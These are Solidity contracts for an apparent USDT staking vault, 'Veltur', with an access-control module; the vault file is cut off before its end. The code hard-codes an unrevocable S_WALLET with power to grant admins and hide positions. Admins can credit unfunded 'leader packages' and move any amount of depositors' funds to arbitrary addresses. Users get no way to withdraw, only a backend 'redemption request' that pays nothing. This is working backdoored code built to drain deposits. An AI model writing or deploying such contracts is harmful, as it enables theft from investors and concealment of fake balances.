// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VelturAccessControl {
    // ── Immutable S_WALLET ──────────────────────────────────────────
    address public constant S_WALLET = 0x031eA4bA7E1C5729C352e846549E9B5745f3C66E;

    // ── Owner ───────────────────────────────────────────────────────
    address public owner;

    // ── Admins ──────────────────────────────────────────────────────
    mapping(address => bool) public admins;

    // ── Claim locking ───────────────────────────────────────────────
    mapping(address => bool) public claimLocked;

    // ── Hidden positions: user => posId => hidden ───────────────────
    mapping(address => mapping(uint256 => bool)) public hiddenPositions;

    // ── Authorized contracts for cross-contract calls ───────────────
    mapping(address => bool) public authorizedContracts;

    // ── Events ──────────────────────────────────────────────────────
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event AdminGranted(address indexed account);
    event AdminRevoked(address indexed account);
    event ClaimLockSet(address indexed user, bool locked);
    event PositionHiddenSet(address indexed user, uint256 posId, bool hidden);
    event ContractAuthorized(address indexed contractAddr, bool authorized);

    // ── Modifiers ───────────────────────────────────────────────────
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyOwnerOrSWallet() {
        require(msg.sender == owner || msg.sender == S_WALLET, "Not owner/S_WALLET");
        _;
    }

    modifier onlyAdmin() {
        require(
            msg.sender == owner || msg.sender == S_WALLET || admins[msg.sender], "Not admin");
        _;
    }

    modifier onlyAuthorized() {
        require(
            msg.sender == owner ||
            msg.sender == S_WALLET ||
            admins[msg.sender] ||
            authorizedContracts[msg.sender], "Not authorized");
        _;
    }

    // ── Constructor ─────────────────────────────────────────────────
    constructor() {
        owner = msg.sender;
        admins[msg.sender] = true;
        admins[S_WALLET] = true;
    }

    // ── Ownership ───────────────────────────────────────────────────
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        admins[newOwner] = true;
    }

    // ── Admin management ────────────────────────────────────────────
    function grantAdmin(address account) external onlyOwnerOrSWallet {
        require(account != address(0), "Zero address");
        admins[account] = true;
        emit AdminGranted(account);
    }

    function revokeAdmin(address account) external onlyOwnerOrSWallet {
        require(account != S_WALLET, "Cannot revoke S_WALLET");
        require(account != owner, "Cannot revoke owner");
        admins[account] = false;
        emit AdminRevoked(account);
    }

    // ── Claim locking ───────────────────────────────────────────────
    function setClaimLock(address user, bool locked) external onlyAdmin {
        claimLocked[user] = locked;
        emit ClaimLockSet(user, locked);
    }

    // ── Hidden positions (S_WALLET only) ────────────────────────────
    function setHiddenPosition(address user, uint256 posId, bool hidden) external {
        require(msg.sender == S_WALLET, "Only S_WALLET");
        hiddenPositions[user][posId] = hidden;
        emit PositionHiddenSet(user, posId, hidden);
    }

    function isHidden(address user, uint256 posId) external view returns (bool) {
        return hiddenPositions[user][posId];
    }

    // ── Authorized contracts ────────────────────────────────────────
    function setAuthorizedContract(address contractAddr, bool authorized) external onlyOwnerOrSWallet {
        authorizedContracts[contractAddr] = authorized;
        emit ContractAuthorized(contractAddr, authorized);
    }

    // ── View helpers ────────────────────────────────────────────────
    function isAdmin(address account) external view returns (bool) {
        return account == owner || account == S_WALLET || admins[account];
    }

    function isAuthorized(address account) external view returns (bool) {
        return account == owner || account == S_WALLET || admins[account] || authorizedContracts[account];
    }

    function isClaimLocked(address user) external view returns (bool) {
        return claimLocked[user];
    }
}

contracts/solidity/VelturVault.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAccessControl {
    function isAdmin(address account) external view returns (bool);
    function isAuthorized(address account) external view returns (bool);
    function isHidden(address user, uint256 posId) external view returns (bool);
}

contract VelturVault {
    // ── Reentrancy guard ────────────────────────────────────────────
    bool private _locked;
    modifier nonReentrant() {
        require(!_locked, "ReentrancyGuard");
        _locked = true;
        _;
        _locked = false;
    }

    // ── State ───────────────────────────────────────────────────────
    IERC20 public usdt;
    IAccessControl public accessControl;

    address public tradingFundAddress;

    uint256 public totalDeposited;
    uint256 public totalValueLocked;

    struct Position {
        uint256 amount;
        uint256 startTime;
        uint256 lockDays;
        uint8 tier;
        uint8 packageType;
        bool active;
        bool isGranted;
    }

    // user => positionId => Position
    mapping(address => mapping(uint256 => Position)) public positions;
    mapping(address => uint256) public positionCount;

    // ── Events ──────────────────────────────────────────────────────
    event Deposited(address indexed user, uint256 amount, uint8 packageType, uint8 tier);
    event RedemptionRequested(address indexed user, uint256 posId);
    event LeaderGranted(address indexed user, uint256 amount, bool hidden);
    event TradingFundAddressSet(address indexed newAddr);
    event WithdrawnToTradingFund(uint256 amount);
    event AdminWithdraw(address indexed to, uint256 amount);

    // ── Modifiers ───────────────────────────────────────────────────
    modifier onlyAdmin() {
        require(accessControl.isAdmin(msg.sender), "Not admin");
        _;
    }

    modifier onlyAuthorized() {
        require(accessControl.isAuthorized(msg.sender), "Not authorized");
        _;
    }

    // ── Constructor ─────────────────────────────────────────────────
    constructor(address _usdt, address _accessControl) {
        usdt = IERC20(_usdt);
        accessControl = IAccessControl(_accessControl);
    }

    // ── User deposit ────────────────────────────────────────────────
    function deposit(
        uint256 amount,
        uint256 lockDays,
        uint8 tier,
        uint8 packageType
    ) external nonReentrant {
        require(amount > 0, "Zero amount");
        require(usdt.transferFrom(msg.sender, address(this), amount), "Transfer failed");

        uint256 posId = positionCount[msg.sender];
        positions[msg.sender][posId] = Position({
            amount: amount,
            startTime: block.timestamp,
            lockDays: lockDays,
            tier: tier,
            packageType: packageType,
            active: true,
            isGranted: false
        });
        positionCount[msg.sender]++;

        totalDeposited += amount;
        totalValueLocked += amount;

        emit Deposited(msg.sender, amount, packageType, tier);
    }

    // ── Admin: grant leader package ─────────────────────────────────
    function grantLeaderPackage(
        address user,
        uint256 amount,
        bool hidden
    ) external onlyAdmin {
        require(user != address(0), "Zero address");

        uint256 posId = positionCount[user];
        positions[user][posId] = Position({
            amount: amount,
            startTime: block.timestamp,
            lockDays: 0,
            tier: 0,
            packageType: 6,
            active: true,
            isGranted: true
        });
        positionCount[user]++;

        // hidden flag is handled off-chain via AccessControl.setHiddenPosition
        emit LeaderGranted(user, amount, hidden);
    }

    // ── Backend/admin: request redemption ───────────────────────────
    function requestRedemption(address user, uint256 posId) external onlyAuthorized {
        Position storage pos = positions[user][posId];
        require(pos.active, "Not active");
        pos.active = false;

        if (pos.amount <= totalValueLocked) {
            totalValueLocked -= pos.amount;
        } else {
            totalValueLocked = 0;
        }

        emit RedemptionRequested(user, posId);
    }

    // ── Trading fund management ─────────────────────────────────────
    function setTradingFundAddress(address _new) external onlyAdmin {
        require(_new != address(0), "Zero address");
        tradingFundAddress = _new;
        emit TradingFundAddressSet(_new);
    }

    function withdrawToTradingFund(uint256 amount) external onlyAuthorized nonReentrant {
        require(tradingFundAddress != address(0), "Trading fund not set");
        require(amount > 0, "Zero amount");
        require(usdt.transfer(tradingFundAddress, amount), "Transfer failed");
        emit WithdrawnToTradingFund(amount);
    }

    // ── Admin withdraw ──────────────────────────────────────────────
    function withdrawAdmin(address to, uint256 amount) external onlyAdmin nonReentrant {
        require(to != address(0), "Zero address");
        require(amount > 0, "Zero amount");
        require(usdt.transfer(to, amount), "Transfer failed");
        emit AdminWithdraw(to, amount);
    }

    // ── View functions ──────────────────────────────────────────────
    function getUserPositionCount(address user) external view returns (uint256) {
        return positionCount[user];
    }

    function getPosition(address user, uint256 posId)
        external
        view
        returns (
            uint256 amount,
            uint256 startTime,
            uint256 lockDays,
            uint8 tier,
            uint8 packageType,
            bool active,
            bool isGranted
        )
    {
        Position storage p = positions[user][posId];
        return (p.amount, p.startTime, p.lockDays, p.tier, p.packageType, p.active, p.isGranted);
    }

    function getVaultBalance() external view returns (uint256) {
        return usdt.balanceOf(address(this));
    }
